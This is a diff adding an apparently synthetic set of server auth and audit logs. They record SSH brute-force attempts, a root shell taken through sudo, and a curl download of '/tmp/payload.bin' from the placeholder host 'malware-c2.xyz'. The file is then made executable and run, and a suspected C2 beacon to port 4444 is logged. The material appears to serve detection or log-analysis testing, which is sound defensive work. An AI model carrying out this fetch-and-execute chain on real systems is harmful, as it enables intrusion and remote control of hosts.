@@ -1,0 +1,20 @@
+2026-09-12 02:14:01 sshd[4121]: Failed password for admin from 185.220.101.1 port 51422 ssh2
+2026-09-12 02:14:03 sshd[4123]: Failed password for admin from 185.220.101.1 port 51424 ssh2
+2026-09-12 02:14:05 sshd[4125]: Invalid user oracle from 185.220.101.1 port 51426 ssh2
+2026-09-12 02:14:07 sshd[4127]: Failed password for root from 185.220.101.1 port 51428 ssh2
+2026-09-12 02:14:09 sshd[4129]: Failed password for root from 185.220.101.1 port 51430 ssh2
+2026-09-12 02:15:12 sshd[4131]: Failed password for admin from 185.220.101.1 port 51432 ssh2
+2026-09-12 03:41:22 sshd[4207]: Failed password for svc_backup from 45.33.32.156 port 40118 ssh2
+2026-09-12 03:52:47 sshd[4213]: Failed password for svc_backup from 45.33.32.156 port 40130 ssh2
+2026-09-12 09:03:11 sshd[4310]: Accepted password for admin from 192.168.1.50 port 5522 ssh2
+2026-09-12 09:05:36 sudo[4412]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
+2026-09-12 09:12:44 curl[4501]: downloaded http://malware-c2.xyz/payload.bin to /tmp/payload.bin
+2026-09-12 09:13:02 bash[4510]: chmod +x /tmp/payload.bin
+2026-09-12 09:13:19 bash[4512]: /tmp/payload.bin executed by user admin
+2026-09-13 01:22:58 sshd[5211]: Failed password for ftpuser from 185.220.101.1 port 49882 ssh2
+2026-09-13 22:47:05 sshd[6001]: Failed password for guest from 45.33.32.156 port 41744 ssh2
+2026-09-14 04:08:31 sshd[7120]: Failed password for admin from 185.220.101.1 port 52011 ssh2
+2026-09-14 04:08:33 sshd[7122]: Failed password for admin from 185.220.101.1 port 52013 ssh2
+2026-09-14 08:30:10 systemd[1]: Started Daily apt upgrade and clean activities.
+2026-09-14 08:44:52 sshd[7244]: Accepted password for admin from 192.168.1.50 port 5590 ssh2
+2026-09-14 08:45:20 audit[7250]: C2 beacon suspected: outbound TCP to 185.220.101.2:4444
